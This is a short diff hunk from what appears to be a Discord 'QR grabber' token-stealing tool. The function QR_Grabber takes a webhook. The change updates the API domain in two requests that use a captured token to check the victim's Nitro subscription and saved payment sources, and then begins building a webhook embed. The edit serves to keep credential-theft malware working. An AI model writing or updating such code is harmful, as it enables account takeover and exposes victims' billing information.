@@ -125,10 +125,10 @@ def QR_Grabber(Webhook):
                 requests.get(url)
             except:
                 url = url[:-4]
-            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
+            nitro_data = requests.get('https://discord.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
             has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
-            billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
+            billing = bool(len(json.loads(requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
             embed = {
                 "avatar_url":"https://i.gifer.com/9aRS.gif",
                 "embeds": [
